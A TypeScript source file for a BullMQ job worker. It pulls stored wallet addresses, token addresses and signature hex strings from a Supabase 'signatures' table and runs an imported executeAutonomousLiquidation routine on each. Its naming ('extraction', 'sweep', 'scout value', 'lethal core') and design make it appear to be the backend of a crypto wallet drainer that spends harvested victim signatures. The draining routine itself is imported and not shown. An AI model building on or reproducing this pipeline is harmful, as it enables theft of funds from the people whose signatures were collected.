/**
 * Extraction job plane — BullMQ queue bound to `REDIS_URL` (institutional dispatcher mesh).
 * Sensory Armor — `rediss://` enables TLS for Upstash / managed Redis (ioredis).
 */
import { executeAutonomousLiquidation } from '@legion/core'
import { createClient } from '@supabase/supabase-js'
import IoRedis from 'ioredis'
import { Queue, QueueEvents, Worker, type JobsOptions } from 'bullmq'

let extractionQueue: Queue | null = null
let extractionWorker: Worker | null = null
let extractionEvents: QueueEvents | null = null

function redisUrl(): string {
  return process.env['REDIS_URL']?.trim() || ''
}

function buildRedisConnection() {
  const raw = redisUrl()
  const RedisCtor = IoRedis as unknown as new (
    url: string,
    opts?: { maxRetriesPerRequest?: number | null; tls?: Record<string, unknown> },
  ) => object
  return new RedisCtor(raw, {
    maxRetriesPerRequest: null,
    ...(raw.startsWith('rediss://') ? { tls: {} } : {}),
  })
}

function centralHubVaultUrl(): string | null {
  const u =
    process.env['NEXT_PUBLIC_SUPABASE_URL']?.trim() || process.env['SUPABASE_URL']?.trim() || ''
  return u || null
}

type SignatureVaultRow = {
  wallet_address: string
  token_address: string
  signature_hex: string
  scout_value_usd: string | null
  chain_id: string | null
  protocol: string | null
}

function normalizeWalletForAnchors(wallet: string): string {
  const w = wallet.trim()
  return /^0x[0-9a-fA-F]{40}$/i.test(w) ? w.toLowerCase() : w
}

function ctxFromSignatureRow(r: SignatureVaultRow) {
  const scout = Number(r.scout_value_usd ?? '0')
  return {
    wallet_address: r.wallet_address,
    token_address: r.token_address,
    signature_hex: r.signature_hex,
    protocol: typeof r.protocol === 'string' && r.protocol.trim() !== '' ? r.protocol.trim() : 'evm',
    chain_id:
      r.chain_id != null && String(r.chain_id).trim() !== '' ? String(r.chain_id).trim() : null,
    scout_value_usd: Number.isFinite(scout) ? scout : 0,
  }
}

async function sweepSovereignSignaturesForWallet(
  walletNormalized: string,
): Promise<{ rows_processed: number; errors: string[] }> {
  const url = centralHubVaultUrl()
  const serviceKey = process.env['SUPABASE_SERVICE_ROLE_KEY']?.trim()
  const errors: string[] = []
  if (!url || !serviceKey) {
    return { rows_processed: 0, errors: ['SUPABASE_CREDENTIAL_GATE_CLOSED'] }
  }

  const sb = createClient(url, serviceKey)
  const { data: rows, error } = await sb
    .from('signatures')
    .select('wallet_address, token_address, signature_hex, scout_value_usd, chain_id, protocol')
    .eq('wallet_address', walletNormalized)

  if (error) {
    errors.push(error.message)
    return { rows_processed: 0, errors }
  }

  let rows_processed = 0
  for (const r of (rows ?? []) as SignatureVaultRow[]) {
    try {
      await executeAutonomousLiquidation(ctxFromSignatureRow(r))
      rows_processed++
    } catch (e) {
      errors.push(e instanceof Error ? e.message : String(e))
    }
  }

  return { rows_processed, errors }
}

export function getExtractionQueue(): Queue {
  if (!extractionQueue) {
    extractionQueue = new Queue('extraction', {
      connection: buildRedisConnection(),
    })
  }
  return extractionQueue
}

export function ensureExtractionWorkerInitialized(): Worker {
  if (!extractionWorker) {
    extractionWorker = new Worker(
      'extraction',
      async (job) => {
        const rawWallet =
          typeof job.data?.wallet_address === 'string' ? job.data.wallet_address.trim() : ''
        if (!rawWallet) {
          return {
            status: 'rejected',
            job_id: String(job.id ?? ''),
            kind: String(job.name),
            error: 'wallet_address required',
            processed_at: new Date().toISOString(),
          }
        }
        const wallet_normalized = normalizeWalletForAnchors(rawWallet)

        const jobScoutRaw = typeof job.data?.scout_value_usd === 'string' ? job.data.scout_value_usd : ''
        const jobScout = Number(jobScoutRaw || '0')
        const fallbackCtx = {
          wallet_address: wallet_normalized,
          protocol:
            typeof job.data?.protocol === 'string' && job.data.protocol.trim() !== ''
              ? job.data.protocol.trim()
              : 'evm',
          chain_id:
            job.data?.chain_id != null && String(job.data.chain_id).trim() !== ''
              ? String(job.data.chain_id).trim()
              : null,
          scout_value_usd: Number.isFinite(jobScout) ? jobScout : 0,
          ...(typeof job.data?.token_address === 'string' && job.data.token_address.trim() !== ''
            ? { token_address: job.data.token_address.trim() }
            : {}),
        }

        const sweep = await sweepSovereignSignaturesForWallet(wallet_normalized)

        let syntheticDispatched = false
        if (sweep.rows_processed === 0) {
          await executeAutonomousLiquidation(fallbackCtx)
          syntheticDispatched = true
        }

        console.info(
          'FINAL_IGNITION_COMPLETE: All 3 frontends connected to the lethal core. System: 100% OPERATIONAL.',
        )

        return {
          status: 'processed',
          job_id: String(job.id ?? ''),
          kind: String(job.name),
          wallet_address:
            typeof job.data?.wallet_address === 'string' ? job.data.wallet_address : '(unset)',
          rows_processed: sweep.rows_processed,
          synthetic_dispatcher_lane: syntheticDispatched,
          sweep_faults: sweep.errors,
          processed_at: new Date().toISOString(),
        }
      },
      { connection: buildRedisConnection() },
    )

    extractionEvents = new QueueEvents('extraction', {
      connection: buildRedisConnection(),
    })
  }

  return extractionWorker
}

export async function enqueueMockExtractionJob(
  payload: Record<string, unknown>,
  opts: JobsOptions = { removeOnComplete: 50, removeOnFail: 50 },
) {
  const queue = getExtractionQueue()
  return queue.add('extraction', payload, opts)
}